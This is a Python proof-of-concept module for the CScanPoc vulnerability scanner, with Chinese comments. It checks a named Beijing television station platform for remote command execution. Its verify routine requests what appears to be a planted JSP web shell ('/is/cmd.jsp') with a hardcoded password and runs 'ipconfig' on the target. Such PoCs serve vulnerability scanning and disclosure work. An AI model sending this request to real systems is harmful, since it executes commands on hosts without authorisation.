# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Cncert_0008'  # 平台漏洞编号
    name = '北京电视台业务平台远程命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-08-31'  # 漏洞公布时间
    desc = '''
        北京电视台业务平台远程命令执行漏洞，攻击者可以通过构造恶意语句来执行任意远程命令。
    '''  # 漏洞描述
    ref = 'Unknown'  # https://wooyun.shuimugan.com/bug/view?bug_no=125497
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '北京电视台'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7ba7885a-1abe-45ca-ad08-8d679bec37c7'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/is/cmd.jsp?pwd=023&cmd=ipconfig'
            response = requests.get(vul_url)
            if response.status_code == 200 and 'Windows IP' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
